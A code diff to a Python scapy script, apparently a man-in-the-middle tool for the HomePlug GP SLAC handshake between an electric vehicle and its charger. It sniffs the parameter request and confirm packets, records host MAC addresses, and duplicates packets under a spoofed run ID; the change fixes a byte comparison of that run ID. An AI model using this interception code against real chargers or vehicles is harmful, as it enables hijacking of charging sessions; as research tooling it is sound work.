@@ -1,9 +1,9 @@
 import logging
-from scapy.all import Ether, sendp
+from scapy.all import Ether
 from scapy.contrib.homepluggp import HomePlugGPTypes, CM_ATTEN_CHAR_IND, CM_MNBC_SOUND_IND, CM_SLAC_PARM_REQ, CM_SLAC_PARM_CNF
 from ev_simulate_packets import duplicate_parm_req, duplicate_start_atten_char_ind, duplicate_mnbc_sound_ind, duplicate_cm_atten_char_rsp, duplicate_cm_slac_match_req
 from evse_simulate_packets import duplicate_cm_slac_parm_cnf, duplicate_cm_atten_char_ind, duplicate_cm_slac_match_cnf
-
+from general_simulate_packets import str_with_colon_to_bytes
 
 ev_host_mac = None
 evse_host_mac = None
@@ -11,6 +11,7 @@ evse_modem_mac = None
 original_evse_id = None
 original_ev_id = None
 original_ev_run_id = None
+mitm_ev_run_id_bytes = None
 
 hpgp_types = {v: k for k, v in HomePlugGPTypes.items()}
 
@@ -36,9 +37,12 @@ def handle_packet(
         nid_original_ev_simulated_evse,
         nmk_original_ev_simulated_evse
         ):
-    global ev_host_mac, evse_host_mac, evse_modem_mac, original_evse_id, original_ev_id, original_ev_run_id
+    global ev_host_mac, evse_host_mac, evse_modem_mac, original_evse_id, original_ev_id, original_ev_run_id, mitm_ev_run_id_bytes
 
     init_logger()
+
+    if not mitm_ev_run_id_bytes:
+        mitm_ev_run_id_bytes = str_with_colon_to_bytes(mitm_ev_run_id)
 
     if not packet.haslayer(Ether) or not 'HomePlugAV' in packet:
         return
@@ -46,7 +50,7 @@ def handle_packet(
     # first SLAC packet from original EV host
     if packet['HomePlugAV'].HPtype == hpgp_types['CM_SLAC_PARM_REQ']:
         # make sure not to use the duplicated packet:
-        if packet[CM_SLAC_PARM_REQ].RunID != mitm_ev_run_id:
+        if packet[CM_SLAC_PARM_REQ].RunID != mitm_ev_run_id_bytes:
             ev_host_mac = packet[Ether].src
             logger.info(f'Got first packet (CM_SLAC_PARM_REQ) from EV host: {ev_host_mac} - duplicating')
             duplicate_parm_req(packet, ev_simulation_interface, mitm_ev_mac, mitm_ev_run_id)
@@ -54,7 +58,7 @@ def handle_packet(
     # first SLAC packet from EVSE host
     if ev_host_mac and packet['HomePlugAV'].HPtype == hpgp_types['CM_SLAC_PARM_CNF']:
         # make sure not to use the answer for the duplicated CM_SLAC_PARM_REQ packet
-        if packet[CM_SLAC_PARM_CNF].RunID != mitm_ev_run_id:
+        if packet[CM_SLAC_PARM_CNF].RunID != mitm_ev_run_id_bytes:
             # make sure not to use the duplicated CM_SLAC_PARM_CNF packet
             if packet[Ether].src != mitm_evse_mac:
                 evse_host_mac = packet[Ether].src
